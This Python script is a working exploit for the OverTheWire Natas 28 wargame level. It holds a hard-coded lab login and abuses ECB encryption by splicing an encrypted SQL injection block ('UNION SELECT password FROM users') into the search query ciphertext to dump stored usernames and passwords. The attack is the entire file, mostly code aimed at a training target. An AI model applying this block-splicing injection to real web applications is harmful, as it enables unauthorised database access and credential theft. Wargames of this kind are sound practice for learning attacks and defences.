import base64
from urllib.parse import quote, unquote
from rich.console import Console
import requests

# Target credentials and URL
URL = "http://natas28.natas.labs.overthewire.org/"
URL_search = "http://natas28.natas.labs.overthewire.org/search.php/?query="
AUTH = ('natas28', 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3')

BLOCK_SIZE = 16

console = Console()
fucked = False  # something is fucked

def initialize_session():
    sesh = requests.Session()
    sesh.auth = AUTH
    console.print(f"[green][!][/green] Started session with {sesh.auth}")
    return sesh

def get_raw_ciphertext(input_str : str, session: requests.Session):
    """
    Helper function to send a search query and return the RAW BINARY 
    ciphertext bytes (decoding from URL and Base64 encoding).
    """
    response = session.post(URL, data={'query': input_str}, auth=AUTH)
    
    # Extract the encrypted query string from the redirected response URL
    if 'query=' in response.url:
        encoded_ct = response.url.split('query=')[1]
        raw_bytes = base64.b64decode(unquote(encoded_ct))
        return raw_bytes
    else:
        console.print("[bold red][!] Error: Could not extract query parameter from response.[/]")
        return None

def compute_padding_length(session: requests.Session):
    global fucked
    test_string = ""
    raw_bytes = get_raw_ciphertext(input_str=test_string, session=session)
    if raw_bytes is not None:
        initial_length = len(raw_bytes)
        console.print(f"Initial length of raw binary ciphertext is {initial_length}")
    
    length = 0
    while (length != initial_length + 16):
        test_string += "A"
        raw_bytes = get_raw_ciphertext(input_str = test_string, session = session)
        if raw_bytes is not None:
            length = len(raw_bytes)
        if len(test_string) > 300:
            fucked = True
            break
    
    if fucked:
        console.print("[bold red] String got over 300 characters with no change .. Aborting[/]")
        return None

    padding_length = len(test_string) - 1
    return padding_length

def compute_user_input_indices(padding_length: int, session: requests.Session):
    raw_bytes_null = get_raw_ciphertext(input_str="A" * padding_length, session=session)
    raw_bytes_one = get_raw_ciphertext(input_str="A" * padding_length + "A", session=session)

    if raw_bytes_null is None or raw_bytes_one is None:
        console.print("[bold red] Error in getting server response... returning")
        return 0, 0

    start_idx = 0
    min_len = min(len(raw_bytes_null), len(raw_bytes_one))
    while start_idx < min_len and raw_bytes_null[start_idx] == raw_bytes_one[start_idx]:
        start_idx += 1

    end_idx = start_idx + BLOCK_SIZE

    return start_idx, end_idx

def send_spliced_ciphertext(raw_bytes, session: requests.Session):
    """
    Helper function to re-encode spliced raw ciphertext bytes back into 
    URL/Base64 format and send it to the server to trigger the SQL injection.
    """
    b64_ct = base64.b64encode(raw_bytes).decode('utf-8')
    url_encoded_ct = quote(b64_ct)
    
    target_url = f"{URL}?query={url_encoded_ct}"
    response = session.get(target_url, auth=AUTH)
    return response.text

def main():
    console.print("[bold][*] Starting Natas 28 Exploit Script...[/bold]")
    with console.status("[bold]Natas28 Exploit Script...[/bold]", spinner="dots"):
        sesh = initialize_session()
    
        # STEP 1: CALCULATE THE PREFIX OFFSET
        console.print("Computing the prefix padding length...")
        prefix_padding_len = compute_padding_length(sesh)
        if prefix_padding_len is None:
            return 0
        else:
            console.print(f"[green][!][italic]Final padding length[/] recovered is {prefix_padding_len}")

        # STEP 2: CRAFT AND HARVEST THE ENCRYPTED PAYLOAD BLOCK
        raw_payload = "' UNION SELECT password FROM users -- "
        sql_payload = raw_payload.ljust((len(raw_payload) + BLOCK_SIZE - 1) // BLOCK_SIZE * BLOCK_SIZE, " ")
        
        crafted_input = ("A" * prefix_padding_len) + sql_payload

        start_idx, end_idx = compute_user_input_indices(prefix_padding_len, sesh)
        
        raw_ct_A = get_raw_ciphertext(crafted_input, sesh)

        if raw_ct_A is None:
            console.print(f"[red][bold][!][/bold] The raw ciphertext of the payload is None, terminating...")
            return 0

        payload_block = raw_ct_A[start_idx:end_idx]
        console.print(f"[green][!] Successfully received and spliced the 16-byte block of the payload [/green]")

        # STEP 3: SPLICE THE PAYLOAD INTO A BASELINE CIPHERTEXT
        baseline_ct = get_raw_ciphertext("A" * prefix_padding_len, sesh)

        if baseline_ct is None:
            console.print(f"[red][bold][!][/bold] The raw ciphertext of the baseline response is None, terminating...")
            return 0

        baseline_prefix_blocks = baseline_ct[:start_idx]
        baseline_suffix_blocks = baseline_ct[end_idx:]
        spliced_bytes = baseline_prefix_blocks + payload_block + baseline_suffix_blocks

        # STEP 4: EXECUTE THE INJECTION & READ THE PASSWORD
        result_html = send_spliced_ciphertext(spliced_bytes, sesh)
        print(result_html)

def actually_wtf():
    s      = requests.Session()
    s.auth = AUTH
    # ***********************************************

    # pad plaintext to ensure it takes up a full ciphertext block
    DATA = dict(query="A"*10 + "B"*14)
    r    = s.post(URL, data=DATA)
    
    # get the raw bytes of the ciphertext
    encoded_ciphertext = r.url.split("query=")[1]
    ciphertext = base64.b64decode(unquote(encoded_ciphertext))

    # sql to inject into ciphertext query
    new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
    
    # pad plaintext to ensure it also takes up a whole number of ciphertext blocks
    plaintext = "A"*10 + new_sql + "B"*(16-(len(new_sql)%16))

    DATA = dict(query=plaintext)
    r    = s.post(URL, data=DATA)
    
    encoded_new_ciphertext = r.url.split("query=")[1]
    new_ciphertext = base64.b64decode(unquote(encoded_new_ciphertext))

    offset = 48 + len(plaintext)-10
    encrypted_sql = new_ciphertext[48:offset]
    
    #add the encrypted new sql into the final ciphertext
    final_ciphertext = ciphertext[:64]+encrypted_sql+ciphertext[64:]

    PARAMS = dict(query=base64.b64encode(final_ciphertext).decode("utf-8"))
    r = s.get(URL_search, params=PARAMS)

    print(r.text)
    return None

if __name__ == "__main__":
    # main()
    actually_wtf()